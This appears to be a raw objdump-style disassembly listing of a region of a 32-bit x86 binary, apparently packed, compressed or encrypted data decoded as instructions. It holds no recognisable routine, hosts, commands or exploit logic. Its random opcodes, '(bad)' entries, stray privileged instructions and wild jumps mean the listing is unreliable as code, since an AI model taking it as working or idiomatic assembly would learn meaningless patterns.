  421f42:	xchg   ebx,eax
  421f43:	push   0x48
  421f45:	je     0x421f09
  421f47:	test   eax,0xc1efda4
  421f4c:	inc    edx
  421f4d:	int    0xe4
  421f4f:	adc    DWORD PTR [edi+ebx*8+0x31],ecx
  421f53:	push   0xffffff9b
  421f55:	cmp    bh,BYTE PTR [ecx+0x47]
  421f58:	inc    esp
  421f59:	pushw  ss
  421f5b:	adc    DWORD PTR [edi-0x187d7446],0x7
  421f62:	xchg   edx,eax
  421f63:	xor    DWORD PTR [edx],esp
  421f65:	sti    
  421f66:	outs   dx,DWORD PTR ds:[esi]
  421f67:	mov    edx,0x6c367348
  421f6c:	cli    
	...
  421f79:	add    dh,ch
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [edi-0x330f7907],dh
  421f8b:	call   0x0:0x1fb0001
  421f92:	cmp    al,BYTE PTR [edx+0xfc0122e]
  421f98:	pop    esp
  421f99:	cwde   
  421f9a:	jbe    0x422018
  421f9c:	cwde   
  421f9d:	iret   
  421f9e:	xchg   BYTE PTR [eax+ebx*2-0x70f03410],dh
  421fa5:	inc    ebx
  421fa6:	sbb    eax,0x466e181f
  421fab:	jle    0x422015
  421fad:	push   ebx
  421fae:	loope  0x421f4e
  421fb0:	das    
  421fb1:	and    esi,DWORD PTR [eax+0x7f]
  421fb4:	push   edx
  421fb5:	retf   0xe60d
  421fb8:	loope  0x421f98
  421fba:	xor    BYTE PTR [eax],dh
  421fbc:	push   esp
  421fbd:	and    ah,bl
  421fbf:	mov    esp,0x26d50026
  421fc4:	cdq    
  421fc5:	jae    0x42202f
  421fc7:	xor    DWORD PTR [ebx-0x22ef4361],edx
  421fcd:	or     al,0xb0
  421fcf:	sub    al,0xa6
  421fd1:	sbb    al,0x94
  421fd3:	mov    esi,DWORD PTR [edi]
  421fd5:	and    ebp,ebx
  421fd7:	popa   
  421fd8:	ins    DWORD PTR es:[edi],dx
  421fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fda:	jle    0x42205b
  421fdc:	mov    ds:0x5661b263,al
  421fe1:	jmp    0x23e6:0xa16a84f
  421fe8:	xchg   esp,eax
  421fe9:	enter  0x4cb1,0x28
  421fed:	dec    ebp
  421fee:	adc    DWORD PTR [esi-0x30133885],ebx
  421ff4:	js     0x421f93
  421ff6:	push   0x3f46f9e2
  421ffb:	ret    0xee02
  421ffe:	jmp    0x422055
  422000:	push   0xffffffb5
  422002:	sbb    ebx,DWORD PTR ds:0x13361276
  422008:	loope  0x422027
  42200a:	aaa    
  42200b:	xchg   ah,dl
  42200d:	or     ah,BYTE PTR [esi]
  42200f:	ror    al,cl
  422011:	test   al,0x6f
  422013:	xor    ah,ah
  422015:	and    eax,0xfbc8d34f
  42201a:	adc    eax,0x8c74519
  42201f:	fisttp DWORD PTR [ebx+0x31]
  422022:	cld    
  422023:	enter  0x5ac8,0xd1
  422027:	add    BYTE PTR [edx-0x52],dh
  42202a:	and    BYTE PTR [eax+0x0],ah
  42202d:	bound  esp,QWORD PTR [ebp-0x70]
  422030:	xchg   esp,eax
  422031:	pop    es
  422032:	pop    esp
  422033:	cmp    al,0x29
  422035:	(bad)  
  422036:	dec    ebx
  422037:	mov    ds:0xf5f6af2d,al
  42203c:	pop    ecx
  42203d:	push   ecx
  42203e:	mov    BYTE PTR [eiz*1+0x2a21e53c],dh
  422045:	aam    0x66
  422047:	rcr    BYTE PTR [ecx+0xc],0x21
  42204b:	sub    DWORD PTR [eax+edi*2-0x2d],eax
  42204f:	or     ecx,esp
  422051:	or     edx,DWORD PTR [ecx]
  422053:	repz (bad) 
  422055:	ins    DWORD PTR es:[edi],dx
  422056:	mov    ebp,0xc8d14a01
  42205b:	dec    esi
  42205c:	ret    
  42205d:	cs cwde 
  42205f:	sub    BYTE PTR [ebx],dl
  422061:	aas    
  422062:	fimul  WORD PTR [edx+0x4d]
  422065:	into   
  422066:	inc    ecx
  422067:	das    
  422068:	into   
  422069:	mul    DWORD PTR [ebx+eiz*2-0x2aa6a167]
  422070:	cli    
  422071:	test   BYTE PTR [ecx+0x36],bl
  422074:	out    0x5a,eax
  422076:	inc    ecx
  422077:	inc    ebx
  422078:	cmp    cl,BYTE PTR [edx]
  42207a:	std    
  42207b:	pop    ss
  42207c:	dec    ecx
  42207d:	jno    0x422082
  42207f:	and    al,0x61
  422081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422082:	push   eax
  422083:	in     eax,0xe6
  422085:	loopne 0x422097
  422087:	cmp    al,0x84
  422089:	sbb    BYTE PTR [ebx+0x76],0x1e
  42208d:	lahf   
  42208e:	dec    dl
  422090:	dec    eax
  422091:	test   edx,eax
  422093:	aaa    
  422094:	les    edi,FWORD PTR [ebx]
  422096:	sub    bl,dh
  422098:	shl    DWORD PTR [ebp+0x3e],1
  42209b:	pop    ecx
  42209c:	stos   BYTE PTR es:[edi],al
  42209d:	push   ebx
  42209e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42209f:	add    dl,BYTE PTR [ecx+0x51]
  4220a2:	sbb    ecx,eax
  4220a4:	pop    ebx
  4220a5:	inc    ebp
  4220a6:	mov    edx,0xa46969c7
  4220ab:	adc    al,0xf0
  4220ad:	les    edi,FWORD PTR [eax+ebx*1+0x6c]
  4220b1:	sub    ebx,DWORD PTR [edi]
  4220b3:	xor    dl,dh
  4220b5:	bound  ebx,QWORD PTR [edi-0x2a]
  4220b8:	aas    
  4220b9:	push   es
  4220ba:	xchg   edi,eax
  4220bb:	fs inc eax
  4220bd:	adc    ebx,esp
  4220bf:	cmp    al,0x8
  4220c1:	stc    
  4220c2:	cmp    al,ah
  4220c4:	cmp    al,BYTE PTR [edx]
  4220c6:	mov    dl,BYTE PTR [eax]
  4220c8:	das    
  4220c9:	adc    eax,0x451333bd
  4220ce:	repnz push esp
  4220d0:	sub    eax,0x728fc788
  4220d5:	mov    dh,0x1f
  4220d7:	fcmovne st,st(2)
  4220d9:	mov    dh,0x71
  4220db:	mov    WORD PTR [ebp-0x5d],ss
  4220de:	mov    ds:0xcfb03fbf,eax
  4220e3:	jge    0x4220c1
  4220e5:	cdq    
  4220e6:	dec    edx
  4220e7:	push   ss
  4220e8:	jmp    0x5f62dd3e
  4220ed:	dec    esi
  4220ee:	jmp    DWORD PTR [ebx+0xc]
  4220f1:	dec    edx
  4220f2:	inc    edx
  4220f3:	mov    BYTE PTR [ecx],dh
  4220f5:	and    esi,DWORD PTR [edx-0x2197253c]
  4220fb:	mov    bl,0x53
  4220fd:	cmp    edx,ebp
  4220ff:	and    eax,0x134cc06d
  422104:	inc    eax
  422105:	outs   dx,DWORD PTR ds:[esi]
  422106:	xor    esp,esi
  422108:	push   ebx
  422109:	adc    BYTE PTR [eax-0x1f],al
  42210c:	pop    es
  42210d:	dec    edi
  42210e:	bound  edx,QWORD PTR [ebx-0x26]
  422111:	repz pop eax
  422113:	popa   
  422114:	or     al,0x8a
  422116:	cmp    ebx,DWORD PTR ds:0xbc0b266e
  42211c:	int3   
  42211d:	jg     0x422143
  42211f:	push   ds
  422120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422121:	xchg   esp,eax
  422122:	cmc    
  422123:	and    edi,DWORD PTR [ebx+0x3d46aaf5]
  422129:	imul   ecx,eax,0xe24dfd6a
  42212f:	(bad)  
  422130:	xlat   BYTE PTR ds:[ebx]
  422131:	push   esp
  422132:	fdiv   DWORD PTR [esp+edx*8+0x32]
  422136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422137:	mov    bh,bh
  422139:	cmp    DWORD PTR [ecx],ebp
  42213b:	stos   DWORD PTR es:[edi],eax
  42213c:	mov    eax,ds:0xc165d2a2
  422141:	xchg   ebx,eax
  422142:	out    0x4c,al
  422144:	mov    bl,0x4e
  422146:	dec    edi
  422147:	push   ss
  422148:	and    ch,dh
  42214a:	jae    0x42217d
  42214c:	push   eax
  42214d:	cmp    al,BYTE PTR ds:0xc3dbcc67
  422153:	mov    edi,0x56441db8
  422158:	es int3 
  42215a:	pop    eax
  42215b:	cli    
  42215c:	ret    0x12dd
  42215f:	cmp    ah,BYTE PTR [eax-0x3b5831a5]
  422165:	into   
  422166:	jnp    0x42219e
  422168:	enter  0x3481,0xf6
  42216c:	mov    esp,DWORD PTR [eax-0x71]
  42216f:	inc    esi
  422170:	ret    0x88c3
  422173:	inc    esi
  422174:	mov    ebx,0xe9ef0e31
  422179:	adc    BYTE PTR [di+0x68],dh
  42217d:	adc    esp,DWORD PTR cs:[esi-0x2575eb97]
  422184:	pop    ecx
  422185:	push   ds
  422186:	arpl   WORD PTR [ebp-0x72],di
  422189:	stc    
  42218a:	loop   0x4221e4
  42218c:	or     al,BYTE PTR [eax]
	...
  42219a:	push   ebx
  42219b:	(bad)  
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp-0x27],0xc7b792a2
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	sti    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [esi+0x2c232d25],ch
  4221b7:	out    dx,eax
  4221b8:	fidivr DWORD PTR [ebx]
  4221ba:	mov    esi,0x273b1e8
  4221bf:	mov    ds:0x38ac0f1b,eax
  4221c4:	lahf   
  4221c5:	sbb    al,0x56
  4221c7:	adc    eax,0x2f96cc64
  4221cc:	cmp    eax,0xecdb1b71
  4221d1:	call   0xae5c47b6
  4221d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221d7:	stos   BYTE PTR es:[edi],al
  4221d8:	test   edi,ebx
  4221da:	xchg   esp,eax
  4221db:	push   eax
  4221dc:	fbstp  TBYTE PTR ss:[edi]
  4221df:	mov    edi,0x86aa87dd
  4221e4:	jno    0x4221c7
  4221e6:	rol    BYTE PTR [edx-0x61],0xda
  4221ea:	jle    0x4221d5
  4221ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221ed:	add    ch,ah
  4221ef:	dec    ebp
  4221f0:	imul   ebp,esi,0x48
  4221f3:	push   cs
  4221f4:	xchg   ebp,eax
  4221f5:	pop    ebp
  4221f6:	sbb    al,0x8c
  4221f8:	lods   al,BYTE PTR ds:[esi]
  4221f9:	sbb    ah,ah
  4221fb:	(bad)  
  4221fc:	fild   DWORD PTR [eax+0x76e43042]
  422202:	add    edi,DWORD PTR [ecx]
  422204:	dec    edx
  422205:	std    
  422206:	leave  
  422207:	gs mov esp,0xdbc0e0ce
  42220d:	popf   
  42220e:	jno    0x4221f3
  422210:	pop    ecx
  422211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422212:	mov    edx,0x414d2ae0
  422217:	test   DWORD PTR [ecx+ebx*1+0x10],edi
  42221b:	inc    ebp
  42221c:	jp     0x4221b5
  42221e:	cld    
  42221f:	test   al,bh
  422221:	xor    esi,esp
  422223:	int3   
  422224:	xor    ah,BYTE PTR [edx+0x65]
  422227:	xor    al,0x4c
  422229:	mov    al,0xd0
  42222b:	es add eax,0x9478e062
  422231:	icebp  
  422232:	mov    ecx,0xc968e1a4
  422237:	sub    DWORD PTR [eax+0x29],esi
  42223a:	fstp   TBYTE PTR [esi+0x6722b650]
  422240:	sub    BYTE PTR [edi+0x2a15e842],dh
  422246:	pop    esi
  422247:	into   
  422248:	and    BYTE PTR [edx+eax*4],cl
  42224b:	pusha  
  42224c:	ja     0x4222b2
  42224e:	mov    ebp,0x6b9346c6
  422253:	jmp    0x48eec0ae
  422258:	jno    0x422231
  42225a:	adc    cl,BYTE PTR [ebx+eiz*1-0x69]
  42225e:	bound  ecx,QWORD PTR [ebx+0x54f508fb]
  422264:	cmp    eax,0xb4bb2a74
  422269:	sub    eax,0xb016bf6c
  42226e:	or     al,0x16
  422270:	scas   al,BYTE PTR es:[edi]
  422271:	mov    ah,0xe8
  422273:	or     dl,BYTE PTR [edx-0x4993e37a]
  422279:	(bad)  [edi]
  42227b:	cmp    eax,DWORD PTR [ebx+0x2]
  42227e:	int    0x17
  422280:	mov    BYTE PTR [esi-0x47],dh
  422283:	dec    esi
  422284:	add    cl,ch
  422286:	sbb    eax,0xc1fa45ea
  42228b:	outs   dx,BYTE PTR ds:[esi]
  42228c:	mov    bl,0xf4
  42228e:	inc    esi
  42228f:	arpl   WORD PTR [ebx+eax*2-0x6a],bp
  422293:	shr    BYTE PTR [edx],1
  422295:	mov    fs,WORD PTR [eax]
  422297:	adc    DWORD PTR [ebp+0x6acc8523],esi
  42229d:	fwait
  42229e:	cs adc al,0x52
  4222a1:	adc    eax,0x28fcfd68
  4222a6:	(bad)  
  4222a7:	pop    ss
  4222a8:	push   ss
  4222a9:	in     al,0xc2
  4222ab:	test   DWORD PTR [edx-0x41],edx
  4222ae:	adc    ecx,ebx
  4222b0:	xchg   ebp,eax
  4222b1:	test   al,0x3
  4222b3:	jle    0x42232e
  4222b5:	xchg   BYTE PTR [edi+0x3a],ch
  4222b8:	and    esi,ebp
  4222ba:	inc    esi
  4222bb:	sub    ebp,DWORD PTR [esi+ebp*1+0x5ec8e3cc]
  4222c2:	sbb    cl,BYTE PTR [ecx+0x5a3eef25]
  4222c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222c9:	loope  0x4222eb
  4222cb:	xor    al,0xce
  4222cd:	les    esi,FWORD PTR [ebp+0x4b]
  4222d0:	dec    ebp
  4222d1:	ret    0x7f19
  4222d4:	mov    dh,0x4f
  4222d6:	test   al,0x44
  4222d8:	arpl   WORD PTR [eax+0x3],di
  4222db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222dc:	xor    eax,0xb6869548
  4222e1:	aaa    
  4222e2:	test   DWORD PTR [esi-0x3ec5f1b0],ecx
  4222e8:	mov    dl,0xc9
  4222ea:	ds adc ch,bl
  4222ed:	sbb    ah,ch
  4222ef:	inc    ecx
  4222f0:	nop
  4222f1:	call   0xf1e4e6b1
  4222f6:	push   edx
  4222f7:	ins    DWORD PTR es:[edi],dx
  4222f8:	call   0x3d8bc155
  4222fd:	inc    ebp
  4222fe:	seto   BYTE PTR [edx-0x34]
  422302:	dec    edi
  422303:	(bad)  [esi]
  422305:	fdivr  st(5),st
  422307:	xchg   edx,eax
  422308:	shr    DWORD PTR [edi-0x2438fa15],1
  42230e:	fstp   st(6)
  422310:	cmp    eax,ebx
  422312:	stc    
  422313:	push   eax
  422314:	xchg   ecx,eax
  422315:	fild   QWORD PTR [edx-0x74]
  422318:	adc    BYTE PTR [esp+ebp*1],ch
  42231b:	(bad)  
  42231d:	rol    DWORD PTR [esi+0x66dea7df],1
  422323:	pop    edi
  422324:	jge    0x422367
  422326:	or     ecx,DWORD PTR [edi-0xdb1104b]
  42232c:	scas   eax,DWORD PTR es:[edi]
  42232d:	mov    dl,0xfb
  42232f:	out    dx,eax
  422330:	pop    ecx
  422331:	jne    0x4222d1
  422333:	push   ss
  422334:	cs and al,0x83
  422337:	xchg   esp,eax
  422338:	cs push edx
  42233a:	xor    al,0x54
  42233c:	scas   eax,DWORD PTR es:[edi]
  42233d:	test   al,0x82
  42233f:	aad    0x11
  422341:	mov    eax,cs
  422343:	adc    bh,BYTE PTR [edx+0x3f]
  422346:	loopne 0x422397
  422348:	xchg   esi,eax
  422349:	ret    0xd3ac
  42234c:	adc    eax,0xc8cc7ebc
  422351:	pop    edi
  422352:	push   edx
  422353:	or     eax,0xb18217f9
  422358:	cmp    BYTE PTR [ebx-0x7d],dl
  42235b:	aaa    
  42235c:	fs sub eax,0x222959e8
  422362:	es xor al,0xde
  422365:	adc    al,0xc
  422367:	std    
  422368:	cwde   
  422369:	sub    eax,0xb03b18c
  42236e:	inc    ebx
  42236f:	xlat   BYTE PTR ds:[ebx]
  422370:	xchg   bl,ah
  422372:	(bad)  
  422373:	mov    ebx,0xf7af84d2
  422378:	mov    edi,0xeede0bcc
  42237d:	sbb    DWORD PTR [ecx+eiz*2-0x55586ec9],edx
  422384:	pop    edi
  422385:	pop    eax
  422386:	gs dec esp
  422388:	rcr    DWORD PTR [ebx+0x6e],cl
  42238b:	push   edx
  42238c:	mov    al,ds:0x9935da63
  422391:	and    al,0x8a
  422393:	lahf   
  422394:	into   
  422395:	sub    eax,0xbc9fe3d1
  42239a:	cwde   
  42239b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42239c:	mov    ah,0x39
  42239e:	inc    edx
  42239f:	cli    
  4223a0:	push   ecx
  4223a1:	pop    ebx
  4223a2:	jbe    0x422406
  4223a4:	out    dx,eax
  4223a5:	pop    ecx
  4223a6:	jne    0x4223e8
  4223a8:	loop   0x422428
  4223aa:	jp     0x422386
  4223ac:	aad    0x0
	...
  4223ba:	adc    DWORD PTR [esi],ecx
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	sti    
  4223c7:	pop    ecx
  4223c8:	xchg   esp,eax
  4223c9:	jl     0x42238d
  4223cb:	sahf   
  4223cc:	add    DWORD PTR [eax],eax
  4223ce:	sti    
  4223cf:	add    DWORD PTR [eax],eax
  4223d1:	add    BYTE PTR [edx+0x7],ch
  4223d4:	shl    BYTE PTR [ecx-0x6fd407c4],cl
  4223da:	push   0xffffff99
  4223dc:	dec    edi
  4223dd:	ja     0x4223bd
  4223df:	bound  edx,QWORD PTR [ebx-0x28d069b8]
  4223e5:	jns    0x422374
  4223e7:	ins    BYTE PTR es:[edi],dx
  4223e8:	frstor [edi]
  4223ea:	dec    ebx
  4223eb:	xlat   BYTE PTR ds:[ebx]
  4223ec:	lahf   
  4223ed:	add    eax,0xcc77655c
  4223f2:	xchg   ebx,ebp
  4223f4:	js     0x42239c
  4223f6:	mov    dh,0xd2
  4223f8:	and    al,bl
  4223fa:	icebp  
  4223fb:	fcmove st,st(7)
  4223fd:	cmp    al,0xe1
  4223ff:	into   
  422400:	adc    BYTE PTR [edi+0x14],0x7b
  422404:	pop    esi
  422405:	push   0x41
  422407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422408:	jmp    0x95dc:0xda2a1295
  42240f:	sub    dh,BYTE PTR [esi]
  422411:	mov    bl,0xc8
  422413:	mov    edi,0x78c1950e
  422418:	mov    BYTE PTR [esp-0x7c],bh
  42241c:	mul    al
  42241e:	(bad)  
  42241f:	(bad)  [esi-0x1c]
  422422:	pop    edx
  422423:	add    eax,0xd4c651c6
  422428:	sub    ch,BYTE PTR [esi+0x1a33d6d4]
  42242e:	lea    edx,[edi+edx*4+0xc]
  422432:	daa    
  422433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422434:	(bad)  
  422435:	mov    esp,0xba987740
  42243a:	data16 vaddpd ymm4,ymm2,YMMWORD PTR [ebp-0x1e]
  422440:	cmp    BYTE PTR [esp+ebp*1+0x7ec38972],ah
  422447:	jmp    0x4224c4
  422449:	xchg   BYTE PTR ss:[eax+0x58],ch
  42244d:	cmp    al,0x59
  42244f:	inc    edi
  422450:	scas   al,BYTE PTR es:[edi]
  422451:	into   
  422452:	sub    al,0x20
  422454:	or     DWORD PTR [edx],ebx
  422456:	hlt    
  422457:	fmul   QWORD PTR [esi+edx*4]
  42245a:	dec    esi
  42245b:	sub    BYTE PTR [edi],al
  42245d:	xor    al,0x2e
  42245f:	sbb    ecx,esi
  422461:	mov    gs,WORD PTR [edi+ecx*8+0xb15c5e]
  422468:	sbb    esi,DWORD PTR [ecx+0x4b]
  42246b:	cli    
  42246c:	es mov al,0xcf
  42246f:	inc    esi
  422470:	mov    ds:0x1f417949,al
  422475:	stos   BYTE PTR es:[edi],al
  422476:	in     eax,dx
  422477:	je     0x4224d5
  422479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42247a:	in     al,dx
  42247b:	lods   al,BYTE PTR ds:[esi]
  42247c:	mov    edi,0x7c35e5c5
  422481:	push   ss
  422482:	push   esp
  422483:	adc    eax,0xb8012f9d
  422488:	pop    ebp
  422489:	push   0x2d
  42248b:	fmul   DWORD PTR [esi+edx*1+0x2c9aaa42]
  422492:	sub    BYTE PTR [ecx-0x3f],al
  422495:	inc    ebp
  422496:	out    dx,al
  422497:	jle    0x42245d
  422499:	pop    esi
  42249a:	gs inc edx
  42249c:	hlt    
  42249d:	ss popf 
  42249f:	test   DWORD PTR [ecx],ecx
  4224a1:	into   
  4224a2:	into   
  4224a3:	jo     0x42245f
  4224a5:	cmp    bl,dl
  4224a7:	push   ss
  4224a8:	xchg   edi,eax
  4224a9:	aaa    
  4224aa:	scas   eax,DWORD PTR es:[edi]
  4224ab:	scas   al,BYTE PTR es:[edi]
  4224ac:	inc    esi
  4224ad:	push   eax
  4224ae:	pop    ebx
  4224af:	cs int3 
  4224b1:	cmp    eax,0xf136dfb2
  4224b6:	adc    BYTE PTR [ecx+0x2a],ah
  4224b9:	out    0x71,eax
  4224bb:	jl     0x42248d
  4224bd:	push   es
  4224be:	sub    esi,ebx
  4224c0:	in     al,0x92
  4224c2:	aaa    
  4224c3:	retf   0xac5c
  4224c6:	mov    dh,0x5c
  4224c8:	out    dx,al
  4224c9:	pop    esp
  4224ca:	mov    al,ds:0xaa7b9f84
  4224cf:	sub    bh,BYTE PTR [esi-0x44]
  4224d2:	push   ebp
  4224d3:	loopne 0x422463
  4224d5:	sbb    al,0x93
  4224d7:	pushf  
  4224d8:	dec    eax
  4224d9:	jl     0x422536
  4224db:	cmp    BYTE PTR [ebx-0x50],bl
  4224de:	iret   
  4224df:	inc    esp
  4224e0:	sahf   
  4224e1:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4224e3:	sub    BYTE PTR [edi+0x9],bh
  4224e6:	in     al,0x26
  4224e8:	retf   0xb838
  4224eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224ec:	mov    edi,0xeff3584e
  4224f1:	adc    DWORD PTR [ecx],esi
  4224f3:	call   0x588f:0xc4452e5f
  4224fa:	push   esi
  4224fb:	sbb    esi,DWORD PTR [ebx]
  4224fd:	repz arpl WORD PTR [eax+0x24462a43],cx
  422504:	jnp    0x422561
  422506:	inc    ebp
  422507:	jge    0x42254d
  422509:	call   0xd7ad:0x5211d834
  422510:	adc    al,0xa4
  422512:	sahf   
  422513:	lods   eax,DWORD PTR ds:[esi]
  422514:	(bad)  
  422515:	jne    0x42255b
  422517:	inc    edx
  422518:	arpl   WORD PTR [edx+0x41],di
  42251b:	leave  
  42251c:	push   cs
  42251d:	mov    esp,0xa53af48c
  422522:	sbb    DWORD PTR [eax-0x2f],0xffffffb3
  422526:	sbb    BYTE PTR [edx+0x5493fc85],ch
  42252c:	pop    esi
  42252d:	push   ecx
  42252e:	cmp    BYTE PTR [edi-0x5b],ah
  422531:	xlat   BYTE PTR ds:[ebx]
  422532:	retf   
  422533:	jmp    0xc7b914a9
  422538:	jae    0x4225b1
  42253a:	push   edi
  42253b:	xchg   edx,eax
  42253c:	push   ecx
  42253d:	xchg   edi,eax
  42253e:	in     eax,0x6a
  422540:	hlt    
  422541:	mov    bh,0xee
  422543:	add    edi,DWORD PTR [ebx+0x1e]
  422546:	push   cs
  422547:	icebp  
  422548:	es mov bh,0x19
  42254b:	xor    bl,BYTE PTR [ebx+edx*2-0x26]
  42254f:	(bad)  
  422550:	ror    BYTE PTR [ebp+0x17eb508a],cl
  422556:	dec    esi
  422557:	sbb    BYTE PTR [edx+0x39d15442],0x15
  42255e:	add    eax,0x427d2034
  422563:	pop    es
  422564:	repz (bad) 
  422568:	push   edx
  422569:	jle    0x42258b
  42256b:	xor    eax,0xd00fa366
  422570:	dec    esi
  422571:	push   ds
  422572:	sti    
  422573:	popa   
  422574:	mov    al,0x8f
  422576:	in     al,dx
  422577:	loope  0x4225d2
  422579:	ja     0x42256f
  42257b:	jmp    0x422585
  42257d:	xor    esp,ecx
  42257f:	cmp    bh,BYTE PTR ds:0xb1ad3ead
  422585:	pusha  
  422586:	sbb    al,BYTE PTR [esi-0x47]
  422589:	cmp    eax,0xf01c2400
  42258e:	mov    bl,0x5d
  422590:	adc    esp,DWORD PTR [ebx+esi*2-0x4c]
  422594:	imul   esp,DWORD PTR [ecx-0x2ca5c49c],0xffffffd2
  42259b:	popf   
  42259c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42259d:	cmp    ebx,esp
  42259f:	jmp    0x87e7f1f0
  4225a4:	mov    bh,BYTE PTR [edx]
  4225a6:	mov    ecx,0xdd40a993
  4225ab:	shr    BYTE PTR [edi+eax*1],0xcb
  4225af:	jg     0x422606
  4225b1:	mov    al,ds:0x6f8e3f93
  4225b6:	push   edi
  4225b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b8:	mov    ecx,0xb967920d
  4225bd:	sti    
  4225be:	adc    esp,DWORD PTR [bp+si+0x263a]
  4225c3:	push   ds
  4225c4:	div    BYTE PTR [ecx]
  4225c6:	es mov ecx,0x492cba39
  4225cc:	pop    esi
	...
  4225d9:	add    cl,cl
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    edi,edi
  4225e7:	push   ecx
  4225e8:	out    dx,al
  4225e9:	inc    edx
  4225ea:	mov    ebp,0xfb0001a0
  4225ef:	add    DWORD PTR [eax],eax
  4225f1:	add    BYTE PTR [edi+0x48b0235a],al
  4225f7:	adc    al,dh
  4225f9:	into   
  4225fa:	inc    eax
  4225fb:	mov    edi,0x4b59bfe4
  422600:	xchg   esi,eax
  422601:	sbb    eax,0x5996215a
  422606:	(bad)  
  422607:	or     DWORD PTR [edi],ecx
  422609:	xchg   ebp,eax
  42260a:	shl    BYTE PTR [esi-0x76],cl
  42260d:	push   eax
  42260e:	popf   
  42260f:	ficom  DWORD PTR [ebp-0x7d55fab4]
  422615:	rcl    BYTE PTR [ebp-0x18],1
  422618:	sub    eax,0xec93e90e
  42261e:	mov    ch,0x9
  422620:	sbb    bh,BYTE PTR [edx-0x5fb960]
  422626:	xchg   ebp,eax
  422627:	or     edx,DWORD PTR [ebx+0x61]
  42262a:	retf   0xe167
  42262d:	or     DWORD PTR [edx],ebx
  42262f:	mov    eax,cs:0x179f67d3
  422635:	xor    bh,BYTE PTR [esi+0x254acd96]
  42263b:	fimul  DWORD PTR ds:0xcf879274
  422641:	out    dx,al
  422642:	add    eax,0xfe0a70b1
  422647:	mov    ecx,0x2265e54a
  42264c:	je     0x422639
  42264e:	stos   BYTE PTR es:[edi],al
  42264f:	retf   0x4ffc
  422652:	popa   
  422653:	les    esi,FWORD PTR [eax-0x4318ef48]
  422659:	retf   0x4617
  42265c:	into   
  42265d:	jbe    0x422656
  42265f:	adc    ah,BYTE PTR [ebp-0x4]
  422662:	out    0xdc,eax
  422664:	aad    0xea
  422666:	hlt    
  422667:	inc    ebp
  422668:	scas   eax,DWORD PTR es:[edi]
  422669:	mov    ss,WORD PTR ds:0x5ed682a1
  42266f:	push   edx
  422670:	adc    eax,0xad17fe89
  422675:	sub    DWORD PTR [ebx+edi*2-0x78],eax
  422679:	jb     0x42263d
  42267b:	jp     0x4226dd
  42267d:	leave  
  42267e:	sahf   
  42267f:	xlat   BYTE PTR ds:[ebx]
  422680:	mov    dl,0x16
  422682:	fmul   QWORD PTR [edi-0x71ec065a]
  422688:	dec    edi
  422689:	ss dec edx
  42268b:	in     al,dx
  42268c:	xchg   ebx,eax
  42268d:	push   ds
  42268e:	inc    ecx
  42268f:	xor    eax,0xbacc936b
  422694:	sbb    esi,edx
  422696:	sub    eax,0xb2c9b213
  42269b:	ret    
  42269c:	add    eax,0xdfa04954
  4226a1:	mov    ecx,0xca290974
  4226a6:	add    al,0xaa
  4226a8:	sbb    edx,ecx
  4226aa:	add    DWORD PTR [eax+0x74],edx
  4226ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ae:	pop    ss
  4226af:	test   ch,bh
  4226b1:	fistp  QWORD PTR [ebx]
  4226b3:	jecxz  0x4226fe
  4226b5:	mov    bh,0xf5
  4226b7:	cmp    BYTE PTR [ebx-0x2d],ch
  4226ba:	repz fisttp QWORD PTR [ebp+0x50b73c95]
  4226c1:	ficom  DWORD PTR [ebx+0xa]
  4226c4:	add    DWORD PTR ds:0x97288593,0xffffff8e
  4226cb:	jnp    0x422749
  4226cd:	sti    
  4226ce:	push   ss
  4226cf:	or     edx,eax
  4226d1:	and    al,0xc3
  4226d3:	push   edi
  4226d4:	xchg   ebp,eax
  4226d5:	jmp    0x741457d1
  4226da:	aas    
  4226db:	xlat   BYTE PTR ds:[ebx]
  4226dc:	fsubr  DWORD PTR [eax]
  4226de:	mov    edi,0xd7fb55d1
  4226e3:	add    dh,BYTE PTR [ebx+0x43c0d837]
  4226e9:	call   0x64e1:0x13d05c1f
  4226f0:	aam    0x1c
  4226f2:	push   edx
  4226f3:	je     0x422698
  4226f5:	adc    ebx,DWORD PTR [eax-0x62]
  4226f8:	mov    WORD PTR [esi],ds
  4226fa:	mov    cs,WORD PTR [ecx+0x690aef21]
  422700:	rol    DWORD PTR [esi+0x37d08172],cl
  422706:	gs mov ebx,0x7461e00c
  42270c:	cwde   
  42270d:	in     eax,0xec
  42270f:	in     eax,0x41
  422711:	hlt    
  422712:	sbb    eax,DWORD PTR [edi+eiz*4]
  422715:	mov    edi,0x77fca850
